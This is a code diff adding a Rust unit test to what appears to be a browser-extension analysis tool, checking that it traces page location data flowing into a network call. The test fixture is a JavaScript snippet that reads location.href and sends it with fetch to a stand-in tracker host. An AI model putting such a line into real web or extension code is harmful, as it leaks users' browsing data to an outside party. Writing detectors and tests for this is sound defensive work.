@@ -129,3 +129,23 @@ fn test_source_tracker_document_cookie() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Cookie(_))));
 }
+
+#[test]
+fn test_source_tracker_location() {
+    let code = r#"
+        let url = location.href;
+        fetch('https://tracker.com/log', { body: url });
+    "#;
+
+    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Find the endpoint that has data sources (from the fetch call, not the string literal)
+    let endpoint = endpoints
+        .iter()
+        .find(|e| e.url.contains("tracker.com") && !e.data_sources.is_empty())
+        .unwrap();
+    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Location(p) if p == "href")));
+}
